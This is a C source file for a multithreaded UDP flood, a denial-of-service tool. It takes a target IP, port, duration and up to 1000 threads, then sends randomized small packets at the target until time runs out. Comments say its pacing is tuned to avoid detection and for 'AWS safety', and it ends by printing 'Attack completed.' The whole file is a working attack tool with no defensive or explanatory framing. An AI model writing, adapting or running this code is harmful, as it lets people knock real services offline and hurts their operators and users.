#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PACKET_SIZE 16  // Randomized payload size

// Global Config (Set via Command Line Arguments)
int target_port;
char target_ip[16];
int duration;
int threads;
int pps_per_thread = 600;  // Adjusted for AWS safety

// Function to generate randomized UDP flood packets
void *udp_flood(void *arg) {
    struct sockaddr_in target;
    char packet[MAX_PACKET_SIZE];

    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    target.sin_addr.s_addr = inet_addr(target_ip);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    unsigned long long sent_packets = 0;
    unsigned long long start_time = time(NULL);
    
    srand(time(NULL));

    while (time(NULL) - start_time < duration) {
        int packet_size = (rand() % 7) + 9; // Random size between 9 to 15 bytes
        for (int i = 0; i < packet_size; i++) {
            packet[i] = rand() % 256; // Randomized payload
        }
        
        sendto(sock, packet, packet_size, 0, (struct sockaddr *)&target, sizeof(target));
        sent_packets++;

        if (sent_packets >= pps_per_thread) {
            usleep(1500); // More delay to avoid detection
            sent_packets = 0;
        }
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <target_ip> <target_port> <duration> <threads>\n", argv[0]);
        return 1;
    }

    strcpy(target_ip, argv[1]);
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);
    threads = atoi(argv[4]);

    if (threads > 1000) {
        printf("Max 1000 threads allowed!\n");
        return 1;
    }

    pthread_t thread_ids[threads];
    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_ids[i], NULL, udp_flood, NULL);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack completed.\n");
    return 0;
}